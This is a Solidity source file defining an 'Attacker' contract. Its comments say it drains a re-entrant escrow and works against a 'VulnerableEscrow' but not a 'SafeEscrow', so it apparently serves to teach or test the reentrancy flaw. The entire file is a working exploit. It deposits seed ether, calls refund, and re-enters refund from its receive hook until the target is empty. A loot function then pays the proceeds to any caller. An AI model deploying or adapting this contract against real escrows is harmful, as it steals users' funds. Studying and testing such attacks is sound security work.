// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IEscrow {
    function deposit() external payable;
    function refund() external;
}

/// @title Attacker — drains a re-entrant escrow
/// @notice Deposits once, calls refund, then re-enters via `receive` until the
///         target is empty. Works against VulnerableEscrow, fails against SafeEscrow.
contract Attacker {
    IEscrow public immutable target;
    uint256 public immutable unit;

    constructor(address _target) {
        target = IEscrow(_target);
        unit = 1 ether;
    }

    /// @notice Kick off the attack with some seed ETH.
    function attack() external payable {
        require(msg.value >= unit, "seed >= 1 ether");
        target.deposit{value: unit}();
        target.refund();
    }

    /// @notice The re-entrancy hook. Called when the target sends us ETH.
    receive() external payable {
        // While the target still has funds, re-enter refund().
        if (address(target).balance >= unit) {
            target.refund();
        }
    }

    function loot() external {
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "loot failed");
    }
}
